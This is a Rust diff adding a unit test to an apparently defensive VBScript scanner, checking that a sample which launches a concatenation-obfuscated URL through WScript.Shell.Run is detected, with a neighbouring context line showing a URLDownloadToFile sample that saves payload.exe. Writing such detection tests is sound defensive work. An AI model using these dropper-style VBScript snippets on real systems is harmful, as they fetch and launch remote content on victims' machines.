@@ -9449,6 +9449,24 @@ URLDownloadToFile 0, u, "C:\Users\Public\payload.exe", 0, 0"#;
     }
 
     #[test]
+    fn vbs_shell_run_expression_emits_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "ht" & "tps://vbs-run.example/panel", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlLaunch { url, .. } if url == "https://vbs-run.example/panel"
+            )),
+            "WScript.Shell.Run did not emit UrlLaunch: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_concat_variable() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
